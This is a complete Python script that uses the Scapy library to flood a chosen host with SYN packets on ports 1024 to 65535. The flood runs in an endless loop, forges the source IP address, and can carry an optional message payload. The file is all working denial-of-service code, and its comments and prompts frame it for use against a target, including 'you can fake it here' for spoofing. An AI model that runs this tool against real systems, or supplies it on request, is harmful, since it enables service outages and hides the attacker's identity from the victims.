#!/usr/bin/python3

# THIS PROGRAM FLOODS THE TARGET HOST 
# WITH SYN PACKETS ON ALL THE PORTS
# MAKING A DoS OR MAYBE EVEN CRASH THE TARGER SYSTEM
# USES SCAPY LIBRARY TO CARRY OUR PACKET CONSTRUCTION
# AND SENDING THE PACKETS TO THE TARGET (AND FAKING ATTACKER IP)

# NOTE(S):-

# THE SCRIPT FLOODS THE TARGET ON PORTS 1024 TO 65535
# THIS RANGE CAN BE CHANGED BY CHANGING THE VALUES
# IN LINE # 36 FOLLOWING THE SYNTAX : (START_PORT , END_PORT+1)

# THE DEFAULT PORT THE SCRIPT USES FOR THE ATTACK
# IS 4444 ... PLEASE CHECK IF THIS PORT IS OPEN AND FREE FROM 
# ANY OTHER SERVICES BEFORE RUNNING THIS SCRIPT 
# OR YOU MAY CHANGE THE CODE TO ASSIGN A PORT OF YOUR CHOICE
# BY CHANGING THE "sport" FIELD IN LINE #45

# USAGE:-

# ./synFlood.py						:			THIS WILL SIMPLY FLOOD THE TARGET WITH SPAM
# ./synFlood.py <message_text>		:			THIS WILL SIMPLY FLOOD THE TARGET WITH THE MESSAGE TEXT SPECIFIED


from scapy.all import *
import optparse as op			# handles all the -h -o <OPTION> command line option parsing used in the Linux environment
import sys						# sys (system) module is used to handle the command line arguments
from termcolor import colored	# use colored text output on the terminal


def synFlooder(src, dst, msg=None):

	if msg == None:
		for dport in range (1024,65536):			# max. # ports is 65535
			IPlayer = IP(src=src, dst=dst)
			TCPlayer = TCP(sport=4444,dport=dport)
			pkt = IPlayer/TCPlayer
			send(pkt)
	
	else:		
		for dport in range (1024,65536):			# max. # ports is 65535
			IPlayer = IP(src=src, dst=dst)
			TCPlayer = TCP(sport=4444,dport=dport)
			RAWlayer = Raw(load=msg)
			pkt = IPlayer/TCPlayer/RAWlayer
			send(pkt)

def main():
	
	source = input("[*] Enter the source IP address [you can fake it here] : ")
	destination = input("[*] Enter the destination IP address [true IP address of the target] : ")

	if len(sys.argv) == 2:
		message = sys.argv[1]
		try:
			print(colored("[+] Starting the SYN flood attack on target : " + destination + "\nFrom source : " + source + "\nWith message : " + message, "green"))
			while(True):
				synFlooder(source, destination, message)
		except KeyboardInterrupt:
			print(colored("[-] Stopping the SYN flood attack on the target : " + destination, "red"))
			
	elif len(sys.argv) == 1:
		try:
			print(colored("[+] Starting the SYN flood attack on target : " + destination + " from source : " + source, "green"))
			while(True):
				synFlooder(source, destination)
		except KeyboardInterrupt:
			print(colored("[-] Stopping the SYN flood attack on target : " + destination, "red"))
	
	else:
		print("[!] Usage: ./synFlood.py <MESSAGE_IF_ANY>")
		
main()
